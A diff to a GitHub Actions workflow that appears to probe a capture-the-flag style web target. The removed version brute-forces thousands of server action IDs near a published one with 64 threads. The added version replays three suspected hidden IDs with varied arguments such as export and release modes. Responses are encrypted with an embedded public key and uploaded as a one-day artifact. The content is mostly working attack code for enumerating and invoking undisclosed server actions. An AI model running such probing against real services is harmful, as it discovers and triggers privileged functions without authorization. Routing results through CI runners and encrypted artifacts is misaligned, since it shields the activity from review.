@@ -10,9 +10,9 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 3
     steps:
-      - name: Enumerate action IDs near published server reference
+      - name: Retest only suspicious action IDs sequentially
         shell: bash
         run: |
           set -euo pipefail
@@ -30,34 +30,23 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests,pathlib,urllib.parse,json,concurrent.futures
+          import requests,pathlib,urllib.parse,json,time
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']; known=act['id']; hx=known[4:]; n=int(hx,16); url=urllib.parse.urljoin(base,act['endpoint'])
-          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project'],'User-Agent':'Mozilla/5.0'}; args={'workspaceId':boot['workspace'],'projectId':boot['project']}
-          ids=set()
-          for d in range(-4096,4097):
-            if d: ids.add('act_'+format((n+d)&((1<<64)-1),'016x'))
-          hexd='0123456789abcdef'
-          for i,ch in enumerate(hx):
-            for c in hexd:
-              if c!=ch: ids.add('act_'+hx[:i]+c+hx[i+1:])
-          # Nearby rotations / common low suffix changes
-          for last in range(0,65536):
-            if last<256 or last in [0x1337,0x2026,0x8b11,0xbeef,0xcafe,0xdead]:
-              ids.add('act_'+hx[:-4]+format(last,'04x'))
-          ids.discard(known); ids=sorted(ids)
-          def one(aid):
-            try:
-              r=requests.post(url,headers=H,json={'actionId':aid,'args':args},timeout=4,allow_redirects=False)
-              if not (r.status_code==404 and r.text.strip()=='{"error":"unknown_action"}'):
-                return {'actionId':aid,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
-            except Exception: pass
-          hits=[]
-          with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
-            for x in ex.map(one,ids,chunksize=30):
-              if x:hits.append(x)
-          (out/'summary.json').write_text(json.dumps({'count':len(ids),'hits':hits},indent=2))
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          ids=['act_6f4b9a291d0e8a71','act_6f4b9a2c1d038a71','act_6f4b9a2c1d0a8a71']
+          ws=boot['workspace']; p=boot['project']; ref='preview-8b11c'
+          args=[{}, {'workspaceId':ws,'projectId':p},{'deployRef':ref},{'ref':ref},{'workspaceId':ws,'projectId':p,'deployRef':ref},{'projectId':p},{'workspaceId':ws},{'deployRef':ref,'mode':'release'},{'deployRef':ref,'export':True},{'workspaceId':ws,'projectId':p,'mode':'release','export':True}]
+          res=[]
+          for aid in ids:
+            for a in args:
+              try:
+                r=s.post(url,headers=H,json={'actionId':aid,'args':a},timeout=10,allow_redirects=False)
+                res.append({'actionId':aid,'args':a,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+              except Exception as e: res.append({'actionId':aid,'args':a,'error':repr(e)})
+              time.sleep(.15)
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -73,6 +62,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-action-nearby-encrypted
+          name: launchlet-part2-action-retest-encrypted
           path: artifact/
           retention-days: 1
